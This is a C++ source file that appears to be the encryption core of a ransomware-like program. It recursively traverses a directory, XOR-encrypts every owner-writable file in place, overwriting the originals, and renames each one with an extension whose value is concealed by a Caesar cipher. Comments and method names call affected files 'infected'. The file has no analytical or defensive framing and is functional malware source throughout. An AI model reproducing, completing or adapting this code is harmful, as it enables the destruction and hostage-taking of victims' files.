#include "crypt/CryptManager.h"
#include "Logger.h"
#include <iostream>
#include <filesystem>
#include <fstream>

CryptManager::CryptManager(char xorKey) : xorKey(xorKey), encryptor(xorKey) {}

void CryptManager::start(const std::wstring& path) {
	Logger::info(L"Encryption started on path " + path);
	_traverseAndEncrypt(path);
}

void CryptManager::_traverseAndEncrypt(const std::wstring& path) {
	for (const auto& entry : fs::recursive_directory_iterator(path)) {
		if (!entry.is_regular_file()) continue;

		auto perms = entry.status().permissions();
		if ((perms & fs::perms::owner_write) != fs::perms::none) {
			Logger::debug(L"Crypting " + entry.path().wstring());
			_encrypFile(entry);
		}
	}
}

bool CryptManager::_isFileInfected(const std::filesystem::directory_entry& file) const {
	const std::string expected = Obfuscator::decryptCaesar(encryptedExtension, caesarKey);
	const std::string ext = file.path().extension().string();

	return ext.find(expected) != std::string::npos;
}

void CryptManager::_changeExtension(const std::filesystem::directory_entry& file) {
	const std::string nexExt = file.path().extension().string() + Obfuscator::decryptCaesar(encryptedExtension, caesarKey);

	fs::path newPath = file.path();
	newPath.replace_extension(nexExt);

	std::error_code ec;
	fs::rename(file.path(), newPath, ec);
}

void CryptManager::_encrypFile(const std::filesystem::directory_entry& file) {
	auto encrypted = encryptor.XORFile(file.path());

	std::ofstream out(file.path(), std::ios::binary);
	if (out.is_open()) {
		out.write(encrypted.data(), encrypted.size());
		out.close();
	}

	if (!_isFileInfected(file)) {
		_changeExtension(const_cast<fs::directory_entry&>(file));
	}
}
